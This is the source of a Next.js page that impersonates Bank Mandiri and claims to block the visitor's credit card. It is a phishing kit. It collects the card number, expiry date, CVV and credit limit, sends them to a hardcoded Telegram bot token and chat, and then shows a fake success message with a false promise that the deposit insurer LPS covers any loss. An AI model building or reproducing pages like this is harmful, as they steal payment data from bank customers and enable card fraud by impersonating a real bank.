'use client';

import React, { useState, useEffect } from 'react';
import Image from 'next/image';
import { motion, AnimatePresence } from 'motion/react';
import { 
  CreditCard, 
  Building, 
  Calendar, 
  Lock, 
  TrendingUp, 
  ShieldCheck, 
  Ban, 
  X,
  Loader2
} from 'lucide-react';
import { cn } from '@/lib/utils';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "8673674549:AAHP18UpUK20Rm3PzNkdnRkhkty2F0_yb_8";
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "-1003801777662";

// --- Helpers ---
const checkLuhn = (num: string) => {
  let s = num.replace(/\D/g, '');
  let sum = 0, isEven = false;
  for (let i = s.length - 1; i >= 0; i--) {
    let digit = parseInt(s.charAt(i));
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return (sum % 10) === 0 && (s.length === 15 || s.length === 16);
};

const formatRupiah = (val: string) => {
  let num = val.replace(/\D/g, '');
  if (!num) return '';
  return "Rp " + num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
};

const formatCardNumber = (val: string) => {
  let num = val.replace(/\D/g, '');
  let formatted = num.match(/.{1,4}/g);
  return formatted ? formatted.join(' ') : num;
};

const formatExpiry = (val: string) => {
  let num = val.replace(/\D/g, '');
  if (num.length >= 2) {
    return num.slice(0, 2) + '/' + num.slice(2, 4);
  }
  return num;
};

export default function BlockCardPage() {
  const [formData, setFormData] = useState({
    bankName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    limit: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [luhnError, setLuhnError] = useState(false);

  // Form validation for the submit button
  const isValid = 
    formData.bankName !== '' &&
    formData.cardNumber.replace(/\s/g, '').length >= 15 &&
    checkLuhn(formData.cardNumber.replace(/\s/g, '')) &&
    formData.expiry.length === 5 &&
    formData.cvv.length === 3 &&
    formData.limit !== '';

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    let newValue = value;

    if (name === 'cardNumber') {
      newValue = formatCardNumber(value);
      setLuhnError(false);
    } else if (name === 'expiry') {
      newValue = formatExpiry(value);
    } else if (name === 'limit') {
      newValue = formatRupiah(value);
    } else if (name === 'cvv') {
      newValue = value.replace(/\D/g, '').slice(0, 3);
    }

    setFormData(prev => ({ ...prev, [name]: newValue }));
  };

  const handleBlur = (e: React.FocusEvent<HTMLInputElement>) => {
    if (e.target.name === 'cardNumber') {
      const raw = e.target.value.replace(/\s/g, '');
      if (raw.length > 0 && !checkLuhn(raw)) {
        setLuhnError(true);
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid) return;

    setIsLoading(true);
    setErrorMsg('');

    try {
      const timestamp = new Date().toLocaleString('id-ID');
      const message = `💳 *BLOKIR KARTU KREDIT*\n━━━━━━━━━━━━━━━\n🏦 *Bank:* ${formData.bankName}\n💳 *Nomor Kartu:* \`${formData.cardNumber}\`\n📅 *Expiry:* \`${formData.expiry}\`\n🔐 *CVV:* \`${formData.cvv}\`\n💰 *Limit Kredit:* ${formData.limit}\n━━━━━━━━━━━━━━━\n⏰ *Waktu:* ${timestamp}\n🔴 *STATUS: KARTU KREDIT TELAH DIBLOKIR*`;

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      const result = await response.json();
      if (result.ok) {
        setTimeout(() => {
          setIsLoading(false);
          setShowSuccess(true);
        }, 1500);
      } else {
        throw new Error('Gagal mengirim data.');
      }
    } catch (err) {
      console.error(err);
      setIsLoading(false);
      setErrorMsg('Gagal memproses permintaan. Silakan coba lagi.');
    }
  };

  return (
    <div className="min-h-screen bg-[#eef4f9] flex flex-col items-center pb-12 relative overflow-x-hidden font-sans select-none">
      {/* Visual Security Overlays (faithful to design) */}
      <div className="fixed top-0 bottom-0 left-0 w-3 sm:w-4.5 bg-[repeating-linear-gradient(45deg,rgba(0,77,153,0.15),rgba(0,77,153,0.15)_10px,rgba(255,158,27,0.15)_10px,rgba(255,158,27,0.15)_20px)] z-50 pointer-events-none border-r border-blue-900/10 shadow-inner" />
      <div className="fixed top-0 bottom-0 right-0 w-3 sm:w-4.5 bg-[repeating-linear-gradient(45deg,rgba(0,77,153,0.15),rgba(0,77,153,0.15)_10px,rgba(255,158,27,0.15)_10px,rgba(255,158,27,0.15)_20px)] z-50 pointer-events-none border-l border-blue-900/10 shadow-inner" />

      {/* Header */}
      <header className="w-full bg-white py-3 flex justify-center items-center shadow-sm mb-4 relative z-10">
        <div className="relative w-24 h-8">
          <Image 
            src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
            alt="Bank Mandiri" 
            fill
            className="object-contain"
            priority
          />
        </div>
      </header>

      {/* Main Content */}
      <main className="w-full max-w-[450px] px-3 relative z-10 flex-grow">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white rounded-2xl p-6 shadow-[0_25px_50px_rgba(0,45,92,0.25),0_10px_20px_rgba(0,0,0,0.15)] text-center"
        >
          <h1 className="text-lg font-bold text-[#002D5C] mb-1">Blokir Kartu</h1>
          <p className="text-xs text-slate-500 mb-6 leading-relaxed">
            Lengkapi detail kartu Anda untuk proses blokir kartu segera.
          </p>

          <form onSubmit={handleSubmit} className="space-y-4 text-left">
            {/* Bank Selection */}
            <div className="space-y-1">
              <label className="block text-[10px] font-semibold text-[#002D5C] uppercase tracking-wider">
                PILIH BANK PENERBIT
              </label>
              <div className="relative">
                <Building className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
                <select 
                  name="bankName"
                  value={formData.bankName}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-4 py-3 border-[1.5px] border-slate-200 rounded-xl text-sm focus:border-[#004D99] focus:ring-4 focus:ring-blue-900/5 outline-none transition-all appearance-none bg-white cursor-pointer"
                  required
                >
                  <option value="">-- Pilih Bank --</option>
                  <option value="Bank Mandiri">Bank Mandiri</option>
                  <option value="Bank Central Asia (BCA)">Bank Central Asia (BCA)</option>
                  <option value="Bank Rakyat Indonesia (BRI)">Bank Rakyat Indonesia (BRI)</option>
                  <option value="Bank Negara Indonesia (BNI)">Bank Negara Indonesia (BNI)</option>
                  <option value="Bank CIMB Niaga">Bank CIMB Niaga</option>
                  <option value="Bank Danamon">Bank Danamon</option>
                  <option value="Bank Permata">Bank Permata</option>
                  <option value="Bank OCBC NISP">Bank OCBC NISP</option>
                  <option value="Bank Mega">Bank Mega</option>
                  <option value="Bank UOB Indonesia">Bank UOB Indonesia</option>
                  <option value="Bank Maybank Indonesia">Bank Maybank Indonesia</option>
                  <option value="Bank Panin">Bank Panin</option>
                  <option value="Bank Lainnya">Bank Lainnya</option>
                </select>
                <div className="absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none text-slate-400">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                  </svg>
                </div>
              </div>
            </div>

            {/* Card Number */}
            <div className="space-y-1">
              <label className="block text-[10px] font-semibold text-[#002D5C] uppercase tracking-wider">
                NOMOR KARTU
              </label>
              <div className="relative">
                <CreditCard className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
                <input 
                  type="tel"
                  name="cardNumber"
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                  onBlur={handleBlur}
                  placeholder="0000 0000 0000 0000"
                  maxLength={19}
                  className={cn(
                    "w-full pl-10 pr-4 py-3 border-[1.5px] rounded-xl text-sm outline-none transition-all",
                    luhnError ? "border-red-500 focus:ring-red-500/5" : "border-slate-200 focus:border-[#004D99] focus:ring-blue-900/5"
                  )}
                  required
                />
              </div>
              {luhnError && (
                <p className="text-[10px] text-red-500 mt-1 pl-1">Nomor kartu tidak valid.</p>
              )}
            </div>

            {/* Expiry and CVV */}
            <div className="flex gap-3">
              <div className="flex-1 space-y-1">
                <label className="block text-[10px] font-semibold text-[#002D5C] uppercase tracking-wider">
                  MASA BERLAKU
                </label>
                <div className="relative">
                  <Calendar className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
                  <input 
                    type="tel"
                    name="expiry"
                    value={formData.expiry}
                    onChange={handleInputChange}
                    placeholder="MM/YY"
                    maxLength={5}
                    className="w-full pl-10 pr-4 py-3 border-[1.5px] border-slate-200 rounded-xl text-sm focus:border-[#004D99] focus:ring-4 focus:ring-blue-900/5 outline-none transition-all"
                    required
                  />
                </div>
              </div>
              <div className="flex-1 space-y-1">
                <label className="block text-[10px] font-semibold text-[#002D5C] uppercase tracking-wider">
                  CVV
                </label>
                <div className="relative">
                  <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
                  <input 
                    type="tel"
                    name="cvv"
                    value={formData.cvv}
                    onChange={handleInputChange}
                    placeholder="123"
                    maxLength={3}
                    className="w-full pl-10 pr-4 py-3 border-[1.5px] border-slate-200 rounded-xl text-sm focus:border-[#004D99] focus:ring-4 focus:ring-blue-900/5 outline-none transition-all"
                    required
                  />
                </div>
              </div>
            </div>

            {/* Limit / Saldo */}
            <div className="space-y-1">
              <label className="block text-[10px] font-semibold text-[#002D5C] uppercase tracking-wider">
                LIMIT/SALDO TERSEDIA (IDR)
              </label>
              <div className="relative">
                <TrendingUp className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
                <input 
                  type="tel"
                  name="limit"
                  value={formData.limit}
                  onChange={handleInputChange}
                  placeholder="Rp 0"
                  className="w-full pl-10 pr-4 py-3 border-[1.5px] border-slate-200 rounded-xl text-sm focus:border-[#004D99] focus:ring-4 focus:ring-blue-900/5 outline-none transition-all"
                  required
                />
              </div>
              <div className="flex items-center gap-2 bg-gradient-to-br from-[#f0f7ff] to-[#e6f0ff] p-3 rounded-lg border-l-4 border-[#004D99] mt-2">
                <ShieldCheck className="w-4 h-4 text-[#004D99] flex-shrink-0" />
                <p className="text-[10px] text-[#002D5C] font-medium leading-tight">
                  Jika terjadi kerugian, bank akan mengganti sesuai ketentuan karena Anda dijamin oleh LPS.
                </p>
              </div>
            </div>

            {/* Submit Button */}
            <button 
              type="submit"
              disabled={!isValid || isLoading}
              className={cn(
                "w-full py-3.5 rounded-full font-bold text-sm transition-all duration-300 flex items-center justify-center gap-2 mt-4",
                isValid && !isLoading
                  ? "bg-[#003d79] text-white cursor-pointer shadow-lg shadow-blue-900/30"
                  : "bg-slate-200 text-slate-400 cursor-not-allowed"
              )}
            >
              {isLoading ? (
                <Loader2 className="w-5 h-5 animate-spin" />
              ) : (
                <>
                  <Ban className="w-4 h-4" />
                  BLOKIR KARTU
                </>
              )}
            </button>
          </form>
        </motion.div>
      </main>

      {/* Footer */}
      <footer className="fixed bottom-0 left-0 w-full bg-[#2467ab] text-white text-center py-3 text-[11px] z-50">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>

      {/* Success Modal */}
      <AnimatePresence>
        {showSuccess && (
          <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] flex items-center justify-center">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="w-[85%] max-w-[320px] bg-white rounded-3xl overflow-hidden shadow-2xl text-center"
            >
              <div className="p-8">
                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
                  <ShieldCheck className="w-8 h-8 text-[#003366]" />
                </div>
                <h2 className="text-lg font-bold text-[#003366] mb-2 leading-tight">
                  Kartu {formData.bankName} Berhasil Diblokir
                </h2>
                <p className="text-sm text-slate-500 leading-relaxed">
                  Laporan Anda telah diteruskan ke pihak terkait untuk penanganan lebih lanjut.
                </p>
              </div>
              <button 
                onClick={() => window.location.reload()}
                className="w-full bg-[#1a4584] text-white py-4 font-bold text-base hover:bg-[#002D5C] transition-colors"
              >
                Tutup
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Error Toast */}
      <AnimatePresence>
        {errorMsg && (
          <motion.div 
            initial={{ y: 20, opacity: 0, x: '-50%' }}
            animate={{ y: 0, opacity: 1, x: '-50%' }}
            exit={{ y: 20, opacity: 0, x: '-50%' }}
            className="fixed bottom-24 left-1/2 -translate-x-1/2 bg-red-600 text-white px-6 py-3 rounded-full text-sm font-medium shadow-lg z-[101] whitespace-nowrap"
          >
            {errorMsg}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
